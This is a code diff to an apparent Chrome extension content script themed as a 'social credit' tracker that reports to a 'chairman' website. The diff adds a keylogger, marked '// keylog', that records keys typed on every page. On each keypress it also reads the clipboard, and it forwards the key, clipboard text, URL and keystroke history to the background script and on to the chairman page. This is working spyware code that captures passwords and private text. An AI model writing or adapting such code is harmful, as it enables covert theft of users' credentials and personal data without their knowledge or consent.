@@ -12,13 +12,15 @@ function checkForChairmanWebsite() {
 }
 
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-  if (message.socialCredit !== undefined && message.urlList !== undefined) {
+  if (message.type === "BACKGROUND_TO_CONTENT") {
     console.log("Received data from background:", message);
 
     // Send to chairman
     window.postMessage(
       {
         type: "SOCIAL_CREDIT_DATA",
+        keyHistory: message.keyHistory,
+        clipboard: message.clipboard,
         socialCredit: message.socialCredit,
         urlList: message.urlList,
       },
@@ -34,17 +36,21 @@ if (document.readyState === "loading") {
   checkForChairmanWebsite();
 }
 
+// keylog
 window.addEventListener('keydown', handleKeyEvent, true);
-function handleKeyEvent(event) {
+async function handleKeyEvent(event) {
   const key = event.key;
   if (key.length != 1) {
     return
   }
   console.log("Key pressed:", key, "at", window.location.href);
 
+  const clipboard = await navigator.clipboard.readText();
+  
   chrome.runtime.sendMessage({
     type: 'KEYPRESS',
     key,
+    clipboard,
     timestamp: Date.now(),
     url: window.location.href
   });
